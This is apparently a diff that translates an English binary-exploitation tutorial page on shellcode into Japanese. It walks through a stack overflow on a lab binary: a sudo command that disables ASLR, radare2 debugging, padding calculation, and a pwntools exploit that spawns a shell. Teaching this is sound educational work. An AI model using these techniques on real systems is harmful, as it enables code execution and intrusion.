@@ -4,33 +4,33 @@ description: Running your own code
 
 # Shellcode
 
-In real exploits, it's not particularly likely that you will have a `win()` function lying around - shellcode is a way to run your **own** instructions, giving you the ability to run arbitrary commands on the system.
+実際のエクスプロイトでは、都合よく `win()` 関数が転がっていることはあまりありません。シェルコード(shellcode)は**自分の**命令を実行する方法で、システム上で任意のコマンドを実行できるようにします。
 
-**Shellcode** is essentially **assembly instructions**, except we input them into the binary; once we input it, we overwrite the return pointer to hijack code execution and point at our own instructions!
+**シェルコード**は基本的に**アセンブリ命令**ですが、それをバイナリに入力します。入力したら、リターンポインタを上書きしてコード実行を乗っ取り、自分の命令を指すようにします。
 
 {% hint style="danger" %}
-I promise you can trust me but you should never _ever_ run shellcode without knowing what it does. Pwntools is safe and has almost all the shellcode you will ever need.
+私は信頼してもらって大丈夫ですが、何をするものか分からないシェルコードは、_絶対に_実行してはいけません。Pwntools は安全で、必要なシェルコードのほとんどが揃っています。
 {% endhint %}
 
-The reason shellcode is successful is that [Von Neumann architecture](https://en.wikipedia.org/wiki/Von_Neumann_architecture) \(the architecture used in most computers today\) does not differentiate between **data** and **instructions** - it doesn't matter where or what you tell it to run, it will attempt to run it.  Therefore, even though our input is data, the computer _doesn't know that_ - and we can use that to our advantage.
+シェルコードが成功する理由は、[フォン・ノイマン型アーキテクチャ](https://en.wikipedia.org/wiki/Von_Neumann_architecture)(現在のほとんどのコンピュータが採用しているアーキテクチャ)が、**データ**と**命令**を区別しないことにあります。どこで何を実行するように指示しても、それを実行しようとします。したがって、私たちの入力はデータですが、コンピュータは_それを知りません_。これを利用できるのです。
 
 {% file src="../../.gitbook/assets/shellcode.zip" caption="Shellcode" %}
 
-### Disabling ASLR
+### ASLR を無効にする
 
-ASLR is a security technique, and while it is not specifically designed to combat shellcode, it involves randomising certain aspects of memory \(we will talk about it in much more detail later\). This randomisation can make shellcode exploits like the one we're about to do more less reliable, so we'll be disabling it for now [using this](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization).
+ASLR はセキュリティ技術です。シェルコードを防ぐために特別に設計されたものではありませんが、メモリの特定の部分をランダム化します(詳しくは後で扱います)。このランダム化のせいで、これから行うようなシェルコードのエクスプロイトは、確実性が下がることがあります。そこで、[この方法](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)で一時的に無効にします。
 
 ```text
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
 
 {% hint style="danger" %}
-Again, you should never run commands if you don't know what they do
+繰り返しますが、何をするのか分からないコマンドは実行しないでください
 {% endhint %}
 
-### Finding the Buffer in Memory
+### メモリ上のバッファを見つける
 
-Let's debug `vuln()` using `radare2` and work out where in memory the buffer starts; this is where we want to point the return pointer to.
+`radare2` で `vuln()` をデバッグして、バッファがメモリ上のどこから始まるかを調べましょう。リターンポインタをここに向けたいのです。
 
 ```text
 $ r2 -d -A vuln
@@ -41,7 +41,7 @@ $ r2 -d -A vuln
 [...]
 ```
 
-This value that gets printed out is a **local variable** - due to its size, it's fairly likely to be the buffer. Let's set a breakpoint just after `gets()` and find the exact address.
+表示されたこの値は**ローカル変数**です。サイズからして、バッファである可能性がかなり高そうです。`gets()` の直後にブレークポイントを置いて、正確なアドレスを調べましょう。
 
 ```text
 [0x08049172]> dc
@@ -55,11 +55,11 @@ hit breakpoint at: 80491a8
 [...]
 ```
 
-It appears to be at `0xffffcfd4`; if we run the binary multiple times, it should remain where it is \(if it doesn't, make sure ASLR is disabled!\).
+`0xffffcfd4` にあるようです。バイナリを何度か実行しても、位置は変わらないはずです(変わる場合は、ASLR が無効になっているか確認してください)。
 
-### Finding the Padding
+### パディングを見つける
 
-Now we need to calculate the padding until the return pointer. We'll use the De Bruijn sequence as explained in the previous blog post.
+次に、リターンポインタまでのパディングを計算します。前の記事で説明した De Bruijn 配列を使います。
 
 ```text
 $ ragg2 -P 400 -r
@@ -73,11 +73,11 @@ Overflow me
 312
 ```
 
-The padding is 312 bytes.
+パディングは 312 バイトです。
 
-### Putting it all together
+### すべてをまとめる
 
-In order for the shellcode to be correct, we're going to set `context.binary` to our binary; this grabs stuff like the arch, OS and bits and enables pwntools to provide us with working shellcode.
+シェルコードを正しく動かすために、`context.binary` を対象のバイナリに設定します。これでアーキテクチャ、OS、ビット数などが取得され、pwntools が動作するシェルコードを提供してくれます。
 
 ```python
 from pwn import *
@@ -88,10 +88,10 @@ p = process()
 ```
 
 {% hint style="info" %}
-We can use just `process()` because once `context.binary` is set it is assumed to use that process
+`context.binary` を設定すると、そのプロセスを使うものとみなされるので、`process()` だけで済みます
 {% endhint %}
 
-Now we can use pwntools' awesome shellcode functionality to make it _incredibly_ simple.
+あとは pwntools の素晴らしいシェルコード機能を使えば、_驚くほど_簡単です。
 
 ```python
 payload = asm(shellcraft.sh())          # The shellcode
@@ -99,7 +99,7 @@ payload = payload.ljust(312, b'A')      # Padding
 payload += p32(0xffffcfb4)              # Address of the Shellcode
 ```
 
-Yup, that's it. Now let's send it off and use `p.interactive()`, which enables us to communicate to the shell.
+そう、これだけです。送信して、シェルとやり取りできる `p.interactive()` を使いましょう。
 
 ```python
 log.info(p.clean())
@@ -110,7 +110,7 @@ p.interactive()
 ```
 
 {% hint style="warning" %}
-If you're getting an `EOFError`, print out the shellcode and try to find it in memory - the stack address may be wrong
+`EOFError` が出る場合は、シェルコードを出力して、メモリ上で探してみてください。スタックアドレスが間違っている可能性があります
 {% endhint %}
 
 ```text
@@ -131,9 +131,9 @@ $ ls
 exploit.py  source.c  vuln
 ```
 
-And it works! Awesome.
+動きました。素晴らしいです。
 
-### Final Exploit
+### 最終的なエクスプロイト
 
 ```python
 from pwn import *
@@ -153,10 +153,9 @@ p.sendline(payload)
 p.interactive()
 ```
 
-### Summary
+### まとめ
 
-* We injected shellcode, a series of assembly instructions, when prompted for input
-* We then hijacked code execution by overwriting the saved return pointer on the stack and modified it to point to our shellcode
-* Once the return pointer got popped into EIP, it pointed at our shellcode
-* This caused the program to execute our instructions, giving us \(in this case\) a shell for arbitrary command execution
-
+* 入力を求められたときに、アセンブリ命令の並びであるシェルコードを注入しました
+* スタック上の、保存されたリターンポインタを上書きして、シェルコードを指すように変更し、コード実行を乗っ取りました
+* リターンポインタが EIP に pop されると、シェルコードを指すようになりました
+* その結果、プログラムが私たちの命令を実行し、(今回は)任意のコマンドを実行できるシェルが得られました
